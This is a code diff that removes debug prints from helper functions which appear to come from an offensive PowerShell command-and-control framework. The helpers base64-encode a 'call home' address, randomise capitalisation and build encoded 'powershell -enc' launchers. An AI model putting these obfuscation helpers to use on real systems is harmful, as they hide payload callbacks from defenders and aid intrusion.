@@ -170,11 +170,9 @@ def generate_random_script_var_name(origvariname, globDebug=False):
     if globDebug:
         return origvariname
     else:
-        print('helpers: 171')
         origvariname = origvariname.encode('UTF-8')
         entrop = bytes(globentropy)
         hash_object = hashlib.sha1(origvariname + entrop).hexdigest()
-        print('helpers: 173')
         return hash_object[:(3 + (globentropy % 3))]
 
 
@@ -189,12 +187,9 @@ def obfuscate_call_home_address(data):
     """
     Poowershell script to base64 encode variable contents and execute on command as if clear text in powershell
     """
-    print('helpers 190')
     tmp = '$(' + randomize_capitalization(
         '[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\'')
-    print('helpers 193')
     tmp += (enc_powershell(data)).decode('UTF-8') + '\')))'
-    print('helpers 195')
     return tmp
 
 def chunks(l, n):
@@ -235,16 +230,10 @@ def enc_powershell(raw):
     """
     Encode a PowerShell command into a form usable by powershell.exe -enc ...
     """
-    print('helpers: 232')
-    print(raw)
-    raw = raw.encode('UTF-16LE')
-    tmp = raw
+    tmp = base64.b64encode(raw.encode('UTF-16LE'))
+    #tmp = raw
     #tmp = bytes("".join([str(char) + "\x00" for char in raw]), "UTF-16LE")
-    print('helpers 235')
-    print(str(type(tmp)))
-    tmp = base64.b64encode(tmp)
-    print(str(tmp))
-    print('helpers: 237')
+    #tmp = base64.b64encode(tmp)
     return tmp
 
 
@@ -253,7 +242,6 @@ def powershell_launcher(raw, modifiable_launcher):
     Build a one line PowerShell launcher with an -enc command.
     """
     # encode the data into a form usable by -enc
-    print('helpers: 247')
     encCMD = enc_powershell(raw)
 
     return modifiable_launcher + " " + encCMD.decode('UTF-8')
